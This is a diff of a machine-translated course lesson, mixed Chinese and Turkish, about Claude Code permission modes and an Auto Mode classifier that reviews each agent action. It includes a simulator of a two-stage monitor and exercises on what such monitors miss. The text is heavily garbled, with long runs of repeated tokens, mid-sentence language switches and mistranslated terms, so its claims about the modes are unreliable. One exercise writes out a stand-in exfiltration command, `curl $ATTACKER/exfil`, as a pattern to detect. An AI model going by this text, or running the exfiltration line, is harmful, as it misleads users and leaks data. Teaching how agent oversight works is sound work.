@@ -1,6 +1,6 @@
-# 作为自主代理的克劳德代码:权限模式与自动模式
+# Özgür Ajanın Yetki Şekili
 
-> Claude Code 七种权限模式──"plan" 会在每个动作前询问,"default" Sadece riskli hareket sorgularına göre, "acceptEdits" otomatik onay dosyası yazılır, ancak hala  shell 执行 确认, "bypassPermissions" 会批准一切──Auto Mode(2026年3月24日) iki aşamalı bir güvenlik sınıflandırıcısı ile birlikte hareket onayını değiştirir: her hareket tek belirti 快速检查; işaretli hareket toplantısı, düşünce zinciri derin inceleme `max_turns`和 `max_budget_usd`强制执行──Auto Mode 以研究预览 形式发布Anthropic 已明确表示,classifier 单独使用并不足──
+> 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限`auto`权限模式 独立的分类器模型的取代动作批准: 权限模式 独立分类器模型的取代动作批准: 权限模式 取代动作批准: 取代动作批准: 取代动作批准: 取代动作批准: 取代动作批准: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取取取取取的升级: 取代动作审核: 取取取取取取取的动作预算通过`max_turns`和 `max_budget_usd`强制执行──`auto`Yapılandırılabilirlik planın, örgütün etkinliğine, modeline ve tedarikçisine bağlıdır.
 
 **类型：**Öğrenme
 **语言：**Python(stdlib,两阶段 sınıflandırıcı simülatörü)
@@ -11,32 +11,31 @@
 
 Sizin makinerdeki özerk kodlama ajanı bağımsız bir güvenlik sınıfıdır. Bu saldırı, bu ajanın tüm dosya sistemlerine, ağlara, kredi kartlarına, herhangi bir tarayıcı sekmesine, herhangi bir terminal açılmasına erişebilmesi için kullanıldığı açıktır.
 
-Claude Code'un yetki sistemi bir öntemli / özerk openı değil, özerk openı değil, özerk öntemli openı oluşturma yeteneği özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk özerk 
+Claude Code'un yetki sistemi Anthropic tarafından verilen bir cevaptı. Bu bir autonom / not autonomousopen, değil altı model oluşturma yeteneği.
 
 Mühendislik sorusu şu: Bu sistem neyi yakalayabilir, neyi kaybeder ve belirli bir görev için hangi modeli kullanmalı?
 
 ## 概念
 
-### 七种权限模式
+### 六种权限模式
 
 | 模式 | 行为 | 使用场景 |
 |---|---|---|
 | `plan` | Agent 提出计划；用户批准整个计划；每个动作在执行前都会被审查 | 不熟悉的任务；接近 prod 的代码；第一次在某个 repo 上使用 agent |
-| `default` | Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
+| `default` | 在 UI 中标为 “Manual”。Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
 | `acceptEdits` | 文件写入自动批准；shell exec 和 network calls 仍然提示 | 跨很多文件的 refactoring pass |
-| `acceptExec` | shell commands 在经过整理的 allowlist 内自动批准；写入自动批准 | 紧密 inner loops，其中每个 shell command 都是 `npm test` 或类似命令 |
-| `autoMode` | 两阶段 safety classifier；被标记的动作提升为审查 | 受限 workspace 中的 long-horizon unattended runs |
-| `yolo` | 跳过大多数提示；仍然运行 tool allowlist / denylist | 临时 sandboxes、CI jobs、research scripts |
+| `auto` | 由一个独立的 classifier model 在每个动作运行前审阅它；阻止任何超出请求范围的升级 | 受限 workspace 中的 long-horizon unattended runs |
+| `dontAsk` | 从不提示；未被 permission rules 预先批准的动作一律拒绝 | 临时 sandboxes、CI jobs、research scripts |
 | `bypassPermissions` | 批准一切 | 文档说明为“只在你愿意丢弃的 ephemeral containers 内使用” |
 
-(Üst adı ile açık Claude Code docs 一致;"yolo" ise izin veren orta yere yönelik resmi olmayan bir kısaltma adı.
+(Üstteki isimler ve açık Claude Kod dokümanları birleştirilir;`default`标为 Manual。)
 
 ### Bir sayfa anlamak Otomatik Mod
 
 Otomatik Mod ((2026 yılının 3 月 24 日 yayın) ilk olarak modelin onayına verilen yetki modudur.
 
-1. **Stage 1 — single-token classifier。**Bu nedenle onaylanmış hareketler sırada kalmayacak.
-2. **Stage 2 — secondary policy/safety review。**Sadece işaretli hareket üzerinde çalıştırılmaktadır. Bu hareketin etrafında, mevcut durum ve açıklama görevleri, odaklı politika ve güvenlik değerlendirmesi uygulanmaktadır.
+1. **一个独立的 classifier model。**Bu işlemin her bir önerilen işleminin yürütülmesinden önce, görev ve oturum açıklamasına göre, mevcut durumunu değerlendirerek, istek alanından geçen herhangi bir yükseltmeyi durdurur.
+2. **受限的可用性。**Evet mi?`auto`Planın, örgütlerin etkin olup olmadığına, model ve tedarikçiye bağlıdır.
 
 Budget kontrol ve sınıflandırıcı bulunmuyor:
 
@@ -64,9 +63,8 @@ Antropic 将 Auto Mode 作为研究预览发布.文档明确说明,classifier is
 
 - Tanınmamış görevler:`plan`Bir kere kötü bir şekilde çalışmaktan daha ucuz bir plan.
 - 已知 refactor:`acceptEdits`能省下大量确认点击──
-- Gözlemsiz arka plan çalıştırma: Sadece patlama radyusunu ölçtüğünüzde çalışma alanı içinde kullanın `autoMode`(İşlev belgesi yok, üretim süresi yok, başlıca seçim çıkışı yok)
-- Efimeral konteynerler: sadece konteyner olarak kullanılır ve onların kimlikleri terk edilebilir.`yolo`- Ne ?`bypassPermissions`Sadece kabul edilebilir.
-
+- Gözlemsiz arka plan çalıştırma: Sadece patlama radyusunu ölçtüğünüzde çalışma alanı içinde kullanın `auto`(İşlev belgesi yok, üretim süresi yok, başlıca seçim çıkışı yok)
+- Efimeral konteynerler: sadece konteyner olarak kullanılır ve onların kimlikleri terk edilebilir.`dontAsk`- Ne ?`bypassPermissions`Sadece kabul edilebilir.
 
 ```figure
 autonomy-oversight
@@ -74,7 +72,7 @@ autonomy-oversight
 
 ## Kullan
 
-`code/main.py`模拟两阶段分類器──Stage 1 ise, önerilen hareketlerin ucuz anahtar kelime kuralını hedeflemektedir;Stage 2 ise daha yavaş bir çok kural inceleyicisi──drive 输入一段简短的合成轨迹(安全行动、一次快速注射尝试、一次重复循环),并展示分類器 在哪里捕捉到问题、又在哪里漏掉问题──
+`code/main.py`Bir eylem-önzet sınıflandırıcısı koymak iki aşamalı bir boru hattı oluşturmak.`auto`模式背后, dosya açıklaması olan iki aşama anlaşması yerine bağımsız bir sınıflandırıcı modelidir. 1. aşama, önerilen hareketlere yönelik ucuz anahtar kelime kuralıdır. 2. aşama daha yavaş bir çok kural değerlendiricisidir.
 
 ## - Söyle.
 
@@ -86,23 +84,23 @@ autonomy-oversight
 
 2. 扩展 1 aşama kural seti, belli bir bilinen kötü şekli yakalamak için`curl $ATTACKER/exfil`)── benig reaksiyon numune üzerinde yanlış pozitif oranı ölçülüyor──
 
-3. Antropik'in "Agent Loop Nasıl Çalışır" makalesini okuyun.`default`模式下默认触碰的每种外部状态──在无监督运行中`autoMode`Ön, hangi tek kapı gerekir?
+3. Antropik'in "Agent Loop Nasıl Çalışır" makalesini okuyun.`default`模式下默认触碰的每种外部状态──在无监督运行中`auto`Ön, hangi tek kapı gerekir?
 
 4. 24 saat beklenmedik bir bütçe tasarlayın:`max_turns`- Evet.`max_budget_usd`、 her aletin kapıları、 ‒aletçiler── ‖ açıklayın her sayıdaki nedenleri──
 
-5. 描述一个轨迹:其中每个单独动作都被批准的阶段1 和阶段2 ,但组合行为却是错调的──(14 Sınıf 会介绍杀开关和加拿大代币如何处理这个问题──)
+5. 描述一个轨迹:其中的每个单独动作都被分类批准,但组合行为却是错调的──(14 Sınıf 会介绍杀开关和加拿大代币 如何处理这个问题──)
 
 ## 关键术语
 
 | 术语 | 人们常说 | 实际含义 |
 |---|---|---|
-| 权限模式 | “agent 能做多少事” | 控制逐动作批准的七种命名 policy 之一 |
+| 权限模式 | “agent 能做多少事” | 控制逐动作批准的六种命名 policy 之一 |
 | plan mode | “做任何事前都询问” | Agent 编写计划；用户在执行前批准 |
 | acceptEdits | “让它写文件” | 文件写入自动批准；shell exec 仍然提示 |
-| autoMode | “自动批准” | 两阶段 safety classifier；被标记的动作会升级 |
+| auto | “Auto approvals” | 独立的 classifier model 审阅每个动作；阻止超出请求范围的升级 |
 | bypassPermissions | “Full YOLO” | 批准一切；预期用于 ephemeral containers |
-| Stage 1 classifier | “Fast token check” | 针对拟议动作的 single-token rule；并行运行 |
-| Stage 2 classifier | “Deep review” | 对被标记动作进行 chain-of-thought reasoning |
+| Stage 1（simulator） | “Fast keyword check” | `code/main.py` 中针对拟议动作的廉价 rule |
+| Stage 2（simulator） | “Deep review” | `code/main.py` 中针对被标记动作的更慢 multi-rule reviewer |
 | Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能所使用的定位 |
 
 ## 延伸阅读
